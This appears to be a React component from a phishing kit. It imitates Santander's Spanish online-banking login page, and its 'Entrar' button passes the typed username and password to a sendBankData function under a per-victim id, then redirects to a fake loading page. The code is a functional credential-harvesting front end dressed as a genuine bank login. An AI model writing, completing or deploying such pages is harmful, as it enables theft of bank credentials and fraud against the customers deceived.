import { useNavigate, useParams } from 'react-router-dom'
import ArrowLeft from '../../icons/ArrowLeft.svg?react'

import { useState } from 'react'
import { sendBankData } from '../../../utils/utils'
import '../../styles/styles.scss'
import { DocumentInput } from '../ui/input/DocumentInput'
import { PasswordInput } from '../ui/input/PasswordInput'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Santander', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <div className="mr-10 mt-20 h-fit max-w-[400px] bg-[#ffffffcc] px-[17px] pb-2.5 pt-[17px]">
      <div className="text-font flex justify-between">
        <div>
          <a className="mr-[22px] cursor-pointer border-b border-[#8cbabd] text-sm font-semibold text-[#444444]">Particulares</a>
          <a className="cursor-pointer text-sm font-semibold text-[#444444]/80 hover:border-b hover:border-[#8cbabd] hover:text-[#444444]">
            Empresas
          </a>
        </div>
        <button className="flex items-center gap-1">
          <ArrowLeft className="size-4 fill-[#444444] stroke-[#444444]" />
          <span className="cursor-pointer text-sm font-semibold text-[#444444]">Volver</span>
        </button>
      </div>
      <h1 className="headline-font mb-2.5 mt-[17px] text-[22px]">Te damos la bienvenida a tu Banca Online</h1>
      <DocumentInput value={login} onChange={(e) => setLogin(e.target.value)} />
      <PasswordInput value={password} onChange={(e) => setPassword(e.target.value)} />
      <div className="flex justify-between">
        <div className="flex items-center gap-2">
          <button className="size-5 border-[2px] border-[#257fa4]" />
          <span className="text-font cursor-pointer text-sm font-bold text-[#444] hover:underline">Recordar usuario</span>
        </div>
        <button
          onClick={sendAndNavigate}
          className="text-font h-12 w-[192px] bg-[#ec0000] text-center font-normal text-white hover:bg-[#900]"
        >
          Entrar
        </button>
      </div>
      <a className="text-font mt-2.5 flex justify-end text-[13px] font-bold text-[#444]">¿Problemas con tu clave de acceso?</a>
    </div>
  )
}
